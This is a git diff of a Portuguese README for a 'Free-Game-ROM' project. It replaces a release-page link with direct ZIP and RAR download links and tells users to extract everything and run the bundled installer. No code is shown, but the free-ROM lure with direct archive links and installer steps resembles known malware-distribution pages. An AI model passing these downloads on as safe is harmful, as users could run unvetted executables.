@@ -8,7 +8,9 @@
 
 O projeto reúne **40 links** de páginas de jogos nas categorias Nintendo, Sony/PlayStation, Microsoft/Xbox, Sega, Capcom e Commodore. O pacote contém o aplicativo, instaladores, arquivos de texto, créditos e imagens. Jogos e ROMs não estão incluídos no download.
 
-**[Baixar a versão 2.2 em Releases](https://github.com/mega-gerson4/Free-Game-ROM/releases/tag/v2.2)**
+**[BAIXAR ZIP — recomendado](https://github.com/mega-gerson4/Free-Game-ROM/releases/download/v2.2/01-Trun-Game-Free-Mega-2.2.zip)** · **[BAIXAR RAR](https://github.com/mega-gerson4/Free-Game-ROM/releases/download/v2.2/02-Trun-Game-Free-Mega-2.2.rar)**
+
+[Instruções e detalhes da release 2.2](https://github.com/mega-gerson4/Free-Game-ROM/releases/tag/v2.2)
 
 ## O que chegou na versão 2.2
 
@@ -22,7 +24,7 @@ O projeto reúne **40 links** de páginas de jogos nas categorias Nintendo, Sony
 ## Download e instalação
 
 1. Abra **Releases** e escolha a **versão 2.2**.
-2. Em **Assets**, baixe **Trun-Game-Free-Mega-2.2.zip**. O RAR original também está disponível.
+2. Em **Assets**, baixe **01-Trun-Game-Free-Mega-2.2.zip**. O RAR original também está disponível.
 3. Extraia **todos os arquivos** para uma pasta no computador.
 4. Execute o instalador correspondente ao seu sistema, conforme a tabela abaixo.
 5. Aguarde o resultado da instalação antes de abrir o programa.
